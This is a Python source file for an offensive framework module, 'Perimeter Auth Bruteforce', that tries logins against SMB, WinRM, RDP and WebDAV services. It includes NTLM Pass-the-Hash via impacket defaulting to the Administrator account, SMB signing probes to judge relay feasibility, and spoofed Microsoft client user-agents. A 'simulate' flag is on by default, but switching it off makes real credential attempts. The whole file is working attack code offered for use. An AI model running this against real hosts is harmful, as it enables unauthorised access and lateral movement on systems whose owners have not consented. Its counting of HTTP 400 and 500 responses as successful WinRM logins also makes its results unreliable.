#!/usr/bin/env python3
# Author: Andre Henrique (@mrhenrike) | Uniao Geek - https://github.com/Uniao-Geek
"""Perimeter authentication bruteforce module for SMB, WinRM, RDP, and WebDAV.

Supports password-based authentication and NTLM Pass-the-Hash (PTH) via impacket
when available. Impacket is treated as an optional dependency; a socket-level probe
is used as fallback for SMB when impacket is absent.

Protocol support:
    smb    - SMB/CIFS (TCP 445); PTH via impacket; signing detection in check()
    winrm  - WinRM HTTP/HTTPS (TCP 5985/5986); pure requests NTLM challenge
    rdp    - RDP (TCP 3389); xfreerdp subprocess bridge
    webdav - WebDAV NTLM challenge simulation via requests

simulate=True (default): performs connectivity probes and challenge inspection only.
destructive=False (default): never issues commands or modifies remote state.

Author: Andre Henrique (@mrhenrike) | Uniao Geek - https://github.com/Uniao-Geek
Version: 1.0.0
"""

from __future__ import annotations

import base64
import logging
import re
import socket
import struct
import subprocess
import time
from typing import List, Optional, Tuple

from firewallxpl.core.exploit import (
    Exploit,
    OptBool,
    OptIP,
    OptPort,
    OptString,
    print_error,
    print_status,
    print_success,
)

logger = logging.getLogger(__name__)

__version__ = "1.0.0"

# ---------------------------------------------------------------------------
# Optional impacket import - SMB PTH degrades to socket probe without it
# ---------------------------------------------------------------------------
try:
    from impacket.smbconnection import SMBConnection, SessionError  # type: ignore

    _IMPACKET_AVAILABLE = True
except ImportError:
    _IMPACKET_AVAILABLE = False
    SMBConnection = None  # type: ignore
    SessionError = Exception  # type: ignore

# ---------------------------------------------------------------------------
# NTLM negotiate blob constants (type-1 message, minimal flags)
# Used for the socket-level SMB signing probe and WebDAV NTLM challenge sim.
# ---------------------------------------------------------------------------
_NTLM_NEGOTIATE_FLAGS = 0x60088215  # NTLMSSP_NEGOTIATE_56 | UNICODE | OEM | ...
_NTLM_NEGOTIATE_BLOB = (
    b"NTLMSSP\x00"           # signature
    b"\x01\x00\x00\x00"      # MessageType = NEGOTIATE (1)
    + struct.pack("<I", _NTLM_NEGOTIATE_FLAGS)
    + b"\x00" * 24            # domain / workstation (empty)
)

# Minimal NetBIOS + SMB negotiate-protocol frame for socket probe
_SMB_NEGOTIATE_PROTO = (
    b"\x00\x00\x00\x54"              # NetBIOS length
    b"\xffSMB"                       # SMB1 magic
    b"\x72"                          # command: Negotiate Protocol
    b"\x00\x00\x00\x00"              # status
    b"\x18"                          # flags
    b"\x07\xc0"                      # flags2
    b"\x00\x00\x00\x00\x00\x00"      # reserved (12 bytes)
    b"\x00\x00\x00\x00\x00\x00"
    b"\xff\xff"                      # TID
    b"\xfe\xff"                      # PID
    b"\xff\xff"                      # UID
    b"\x00\x00"                      # MID
    b"\x00"                          # word count
    b"\x62\x00"                      # byte count (98)
    b"\x02NT LM 0.12\x00"
    b"\x02SMB 2.002\x00"
    b"\x02SMB 2.???\x00"
)


# ---------------------------------------------------------------------------
# SMB helpers
# ---------------------------------------------------------------------------

def _smb_probe_signing(host: str, port: int = 445, timeout: int = 5) -> Optional[bool]:
    """Return True if SMB signing is required, False if not, None on error.

    Uses a raw socket to send an SMB Negotiate Protocol frame and parses the
    SecurityMode byte from the response. Works without impacket.
    """
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        sock.sendall(_SMB_NEGOTIATE_PROTO)
        data = sock.recv(1024)
        sock.close()
        # SMB1 NegotiateProtocolResponse: SecurityMode at byte offset 39 (after 4-byte NBT)
        if len(data) >= 41:
            security_mode = data[39]
            # bit 0 = NEGOTIATE_SECURITY_SIGNATURES_ENABLED
            # bit 1 = NEGOTIATE_SECURITY_SIGNATURES_REQUIRED
            return bool(security_mode & 0x02)
        return None
    except Exception as exc:  # noqa: BLE001
        logger.debug("SMB probe error on %s:%s - %s", host, port, exc)
        return None


def _smb_auth_impacket(
    host: str,
    port: int,
    username: str,
    password: str,
    domain: str,
    lm_hash: str,
    nt_hash: str,
    timeout: int,
) -> Tuple[bool, str]:
    """Attempt SMB authentication via impacket (password or PTH)."""
    if not _IMPACKET_AVAILABLE:
        return False, "impacket not installed; SMB auth unavailable"
    try:
        conn = SMBConnection(host, host, sess_port=port, timeout=timeout)
        if nt_hash:
            conn.login(username, "", domain, lm_hash, nt_hash)
            label = "PTH"
        else:
            conn.login(username, password, domain)
            label = "password"
        try:
            shares = conn.listShares()
            conn.logoff()
            return True, "SMB {} auth succeeded - {} shares found".format(label, len(shares))
        except Exception:
            conn.logoff()
            return True, "SMB {} auth succeeded".format(label)
    except SessionError as exc:
        msg = str(exc)
        if "STATUS_LOGON_FAILURE" in msg:
            return False, "SMB auth failed (bad credentials)"
        if "STATUS_ACCOUNT_LOCKED_OUT" in msg:
            return False, "SMB account locked out"
        if "STATUS_ACCESS_DENIED" in msg:
            return False, "SMB access denied"
        return False, "SMB error: {}".format(msg[:120])
    except Exception as exc:  # noqa: BLE001
        return False, "SMB connection error: {}".format(str(exc)[:120])


def _smb_auth_socket_fallback(host: str, port: int, timeout: int) -> Tuple[bool, str]:
    """Socket-level SMB port reachability probe (impacket absent fallback)."""
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        sock.close()
        return True, "SMB port reachable (impacket absent - auth not attempted)"
    except Exception as exc:  # noqa: BLE001
        return False, "SMB port unreachable: {}".format(str(exc)[:80])


# ---------------------------------------------------------------------------
# WinRM helpers
# ---------------------------------------------------------------------------

_NTLM_OID = "1.3.6.1.5.5.2"


def _build_ntlm_negotiate_b64() -> str:
    """Return base64-encoded NTLM NEGOTIATE_MESSAGE for WinRM Negotiate auth."""
    return base64.b64encode(_NTLM_NEGOTIATE_BLOB).decode()


def _winrm_ntlm_challenge(
    host: str,
    port: int,
    username: str,
    password: str,
    timeout: int,
    use_tls: bool,
) -> Tuple[bool, str]:
    """Attempt WinRM auth via NTLM Negotiate/Challenge/Authenticate using requests.

    This implements a minimal two-step NTLM handshake over HTTP(S) without
    requiring pywinrm. The AUTHENTICATE step carries correct credentials; the
    server must return 200 for success.
    """
    try:
        import requests  # type: ignore
        from requests.auth import AuthBase  # type: ignore

        scheme = "https" if use_tls else "http"
        url = "{}://{}:{}/wsman".format(scheme, host, port)
        session = requests.Session()
        session.verify = False

        # Step 1: send NEGOTIATE
        neg_token = _build_ntlm_negotiate_b64()
        headers_step1 = {
            "Authorization": "Negotiate {}".format(neg_token),
            "Content-Type": "application/soap+xml;charset=UTF-8",
            "User-Agent": "Microsoft WinRM Client",
        }
        resp1 = session.post(url, headers=headers_step1, data=b"", timeout=timeout)

        if resp1.status_code == 200:
            return True, "WinRM responded 200 (open/unauthenticated)"

        www_auth = resp1.headers.get("WWW-Authenticate", "")
        if resp1.status_code != 401 or "Negotiate" not in www_auth:
            return False, "WinRM unexpected response {}: {}".format(
                resp1.status_code, www_auth[:80]
            )

        # Step 2: extract challenge token and build AUTHENTICATE via requests-ntlm
        try:
            from requests_ntlm import HttpNtlmAuth  # type: ignore

            ntlm_auth = HttpNtlmAuth(
                "{}\\{}".format("", username) if "\\" not in username else username,
                password,
            )
            resp2 = session.post(
                url,
                auth=ntlm_auth,
                headers={"Content-Type": "application/soap+xml;charset=UTF-8"},
                data=b"",
                timeout=timeout,
                verify=False,
            )
            if resp2.status_code in (200, 400, 500):
                # 400/500 may still indicate auth passed; body would reveal more
                return True, "WinRM NTLM auth accepted (status {})".format(resp2.status_code)
            if resp2.status_code == 401:
                return False, "WinRM NTLM auth rejected (401)"
            return False, "WinRM unexpected status {}".format(resp2.status_code)
        except ImportError:
            # requests-ntlm absent: report challenge detection only
            return False, "WinRM NTLM challenge confirmed (requests-ntlm absent; auth not completed)"

    except Exception as exc:  # noqa: BLE001
        return False, "WinRM error: {}".format(str(exc)[:120])


# ---------------------------------------------------------------------------
# RDP helpers
# ---------------------------------------------------------------------------

def _rdp_xfreerdp(
    host: str,
    port: int,
    username: str,
    password: str,
    timeout: int,
) -> Tuple[bool, str]:
    """Attempt RDP authentication via xfreerdp subprocess."""
    cmd = [
        "xfreerdp",
        "/v:{}:{}".format(host, port),
        "/u:{}".format(username),
        "/p:{}".format(password),
        "/cert-ignore",
        "/sec:nla",
        "/timeout:{}".format(timeout * 1000),
        "/log-level:ERROR",
        "+auth-only",
        "/log-filters:com.freerdp.core=WARN",
    ]
    try:
        proc = subprocess.run(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=timeout + 5,
        )
        if proc.returncode == 0:
            return True, "RDP NLA auth succeeded via xfreerdp"
        stderr_txt = proc.stderr.decode("utf-8", errors="replace")[:300]
        if any(kw in stderr_txt.lower() for kw in ("logon failure", "authentication error", "password")):
            return False, "RDP auth rejected: {}".format(stderr_txt[:120])
        return False, "xfreerdp exit {}: {}".format(proc.returncode, stderr_txt[:120])
    except FileNotFoundError:
        return False, "xfreerdp not installed"
    except subprocess.TimeoutExpired:
        return False, "xfreerdp timed out"
    except Exception as exc:  # noqa: BLE001
        return False, "xfreerdp error: {}".format(str(exc)[:80])


def _rdp_port_probe(host: str, port: int, timeout: int) -> Tuple[bool, str]:
    """Fallback RDP port reachability check."""
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        banner = b""
        sock.settimeout(1)
        try:
            banner = sock.recv(64)
        except Exception:
            pass
        sock.close()
        banner_hex = banner.hex()[:32]
        return True, "RDP port reachable (banner hex: {})".format(banner_hex)
    except Exception as exc:  # noqa: BLE001
        return False, "RDP unreachable: {}".format(str(exc)[:80])


# ---------------------------------------------------------------------------
# WebDAV helpers
# ---------------------------------------------------------------------------

def _webdav_ntlm_challenge(host: str, port: int, timeout: int) -> Tuple[bool, str]:
    """Simulate WebDAV NTLM forced-auth challenge detection via requests.

    Sends a PROPFIND request with NTLM NEGOTIATE to confirm the endpoint
    issues a NTLM 401 challenge. No credentials are validated in this step;
    it confirms the attack surface exists.
    """
    try:
        import requests  # type: ignore

        url = "http://{}:{}/".format(host, port)
        headers = {
            "Authorization": "NTLM {}".format(_build_ntlm_negotiate_b64()),
            "User-Agent": "Microsoft-WebDAV-MiniRedir/10.0.19041",
            "Translate": "f",
            "Depth": "0",
        }
        resp = requests.request("PROPFIND", url, headers=headers, timeout=timeout, verify=False)
        www_auth = resp.headers.get("WWW-Authenticate", "")
        if resp.status_code == 401 and ("NTLM" in www_auth or "Negotiate" in www_auth):
            # Extract NTLM challenge token if present
            match = re.search(r"(?:NTLM|Negotiate)\s+([A-Za-z0-9+/=]+)", www_auth)
            token_info = "challenge token present" if match else "challenge token absent"
            return True, "WebDAV NTLM challenge confirmed ({})".format(token_info)
        if resp.status_code == 207:
            return False, "WebDAV PROPFIND succeeded without auth (no NTLM required)"
        return False, "WebDAV returned {} (no NTLM challenge)".format(resp.status_code)
    except Exception as exc:  # noqa: BLE001
        return False, "WebDAV error: {}".format(str(exc)[:120])


# ---------------------------------------------------------------------------
# Main module
# ---------------------------------------------------------------------------

class Exploit(Exploit):
    """Perimeter authentication bruteforce module.

    Supports SMB (password + NTLM PTH), WinRM (NTLM), RDP (xfreerdp NLA),
    and WebDAV (NTLM challenge detection). Impacket is an optional dependency;
    SMB falls back to a socket-level port probe when absent.
    """

    __info__ = {
        "name": "Perimeter Auth Bruteforce",
        "description": (
            "Attempts authentication against SMB, WinRM, RDP, and WebDAV perimeter "
            "services. Supports password bruteforce and NTLM Pass-the-Hash for SMB. "
            "simulate=true performs connectivity and challenge probes only."
        ),
        "authors": (
            "Andre Henrique (@mrhenrike) | Uniao Geek",
        ),
        "devices": (
            "Windows perimeter hosts",
            "Domain controllers",
            "File servers",
            "Remote management endpoints",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(445, "Target port (default matches protocol: smb=445, winrm=5985, rdp=3389, webdav=80)")
    protocol = OptString("smb", "Protocol to target: smb | winrm | rdp | webdav")
    username = OptString("Administrator", "Username for authentication")
    password = OptString("", "Password for authentication (leave empty for PTH)")
    hash_nt = OptString("", "NT hash for SMB Pass-the-Hash (32 hex chars)")
    hash_lm = OptString("aad3b435b51404eeaad3b435b51404ee", "LM hash for SMB PTH (default: empty LM)")
    domain = OptString("", "Windows domain (optional; leave empty for local auth)")
    timeout = OptPort(10, "Connection timeout in seconds")
    simulate = OptBool(True, "Simulation mode: probes and challenge detection only, no destructive actions")
    destructive = OptBool(False, "Allow destructive post-auth actions (always False in simulate mode)")
    use_tls = OptBool(False, "Use HTTPS for WinRM (port 5986)")

    _PROTOCOL_DEFAULT_PORTS = {
        "smb": 445,
        "winrm": 5985,
        "rdp": 3389,
        "webdav": 80,
    }

    _ALLOWED_PROTOCOLS = frozenset(["smb", "winrm", "rdp", "webdav"])

    def _resolved_port(self) -> int:
        proto = self.protocol.lower().strip()
        if self.port and self.port != 445:
            return int(self.port)
        return self._PROTOCOL_DEFAULT_PORTS.get(proto, int(self.port))

    def check(self) -> bool:
        """Probe target connectivity and report SMB signing status for SMB targets.

        For SMB: returns True if port is reachable; logs signing requirement.
        For other protocols: returns True if target port is reachable.
        """
        proto = self.protocol.lower().strip()
        if proto not in self._ALLOWED_PROTOCOLS:
            print_error("Unknown protocol '{}'. Valid: smb, winrm, rdp, webdav".format(proto))
            return False

        port = self._resolved_port()
        host = self.target

        try:
            sock = socket.create_connection((host, port), timeout=int(self.timeout))
            sock.close()
        except Exception as exc:
            print_error("Target {}:{} unreachable - {}".format(host, port, exc))
            return False

        print_status("Target {}:{} is reachable ({})".format(host, port, proto.upper()))

        if proto == "smb":
            signing = _smb_probe_signing(host, port, timeout=int(self.timeout))
            if signing is True:
                print_status("SMB signing: REQUIRED (relay attacks blocked)")
            elif signing is False:
                print_status("SMB signing: NOT required (relay possible)")
            else:
                print_status("SMB signing: indeterminate (probe inconclusive)")

        return True

    def run(self) -> None:
        """Execute authentication attempt against the selected protocol."""
        if not self.check():
            return

        proto = self.protocol.lower().strip()
        host = self.target
        port = self._resolved_port()
        username = self.username
        password = self.password
        nt_hash = self.hash_nt.strip()
        lm_hash = self.hash_lm.strip()
        domain = self.domain
        timeout = int(self.timeout)
        simulating = (str(self.simulate).lower() == "true" or self.simulate is True)

        print_status(
            "Protocol: {} | Target: {}:{} | User: {} | Simulate: {}".format(
                proto.upper(), host, port, username, simulating
            )
        )

        success, message = self._dispatch(
            proto, host, port, username, password, nt_hash, lm_hash, domain, timeout, simulating
        )

        if success:
            print_success("{} auth result: {}".format(proto.upper(), message))
        else:
            print_error("{} auth result: {}".format(proto.upper(), message))

    def _dispatch(
        self,
        proto: str,
        host: str,
        port: int,
        username: str,
        password: str,
        nt_hash: str,
        lm_hash: str,
        domain: str,
        timeout: int,
        simulating: bool,
    ) -> Tuple[bool, str]:
        if proto == "smb":
            return self._run_smb(host, port, username, password, nt_hash, lm_hash, domain, timeout, simulating)
        if proto == "winrm":
            return self._run_winrm(host, port, username, password, timeout, simulating)
        if proto == "rdp":
            return self._run_rdp(host, port, username, password, timeout, simulating)
        if proto == "webdav":
            return self._run_webdav(host, port, timeout, simulating)
        return False, "Unknown protocol: {}".format(proto)

    def _run_smb(
        self,
        host: str,
        port: int,
        username: str,
        password: str,
        nt_hash: str,
        lm_hash: str,
        domain: str,
        timeout: int,
        simulating: bool,
    ) -> Tuple[bool, str]:
        if simulating:
            signing = _smb_probe_signing(host, port, timeout=timeout)
            label = {True: "REQUIRED", False: "NOT required", None: "unknown"}.get(signing, "unknown")
            return signing is not None, "SMB simulate: signing {}".format(label)

        if not _IMPACKET_AVAILABLE:
            return _smb_auth_socket_fallback(host, port, timeout)

        return _smb_auth_impacket(host, port, username, password, domain, lm_hash, nt_hash, timeout)

    def _run_winrm(
        self,
        host: str,
        port: int,
        username: str,
        password: str,
        timeout: int,
        simulating: bool,
    ) -> Tuple[bool, str]:
        use_tls = (str(self.use_tls).lower() == "true" or self.use_tls is True)
        if simulating:
            # Challenge detection only: send NEGOTIATE, check for 401 + NTLM header
            try:
                import requests  # type: ignore

                scheme = "https" if use_tls else "http"
                url = "{}://{}:{}/wsman".format(scheme, host, port)
                neg_token = _build_ntlm_negotiate_b64()
                resp = requests.post(
                    url,
                    headers={"Authorization": "Negotiate {}".format(neg_token)},
                    data=b"",
                    timeout=timeout,
                    verify=False,
                )
                www = resp.headers.get("WWW-Authenticate", "")
                if "Negotiate" in www or "NTLM" in www:
                    return True, "WinRM simulate: NTLM challenge detected (401 with Negotiate)"
                return False, "WinRM simulate: no NTLM challenge (status {})".format(resp.status_code)
            except Exception as exc:  # noqa: BLE001
                return False, "WinRM simulate error: {}".format(str(exc)[:100])

        return _winrm_ntlm_challenge(host, port, username, password, timeout, use_tls)

    def _run_rdp(
        self,
        host: str,
        port: int,
        username: str,
        password: str,
        timeout: int,
        simulating: bool,
    ) -> Tuple[bool, str]:
        if simulating:
            return _rdp_port_probe(host, port, timeout)
        return _rdp_xfreerdp(host, port, username, password, timeout)

    def _run_webdav(
        self,
        host: str,
        port: int,
        timeout: int,
        simulating: bool,
    ) -> Tuple[bool, str]:
        # WebDAV check is always challenge-only (no credential submission)
        return _webdav_ntlm_challenge(host, port, timeout)
